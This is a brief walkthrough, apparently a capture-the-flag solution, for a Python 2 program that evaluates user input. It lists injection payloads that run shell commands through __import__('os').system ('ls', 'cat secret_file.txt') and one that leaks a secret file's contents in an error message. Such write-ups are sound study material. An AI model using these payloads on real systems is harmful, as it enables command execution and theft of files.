1. Run the program with python2
2. Enter the following payload:

__import__('os').system('ls')
(Now you can read all the files)

3. Enter the following payload thereafter:

open('secret_file.txt').read()
(Since this doesn't return an integer, an error will be thrown)
(However, the secret_file will be displayed in the error message)

OR 

__import__('os').system('cat secret_file.txt')
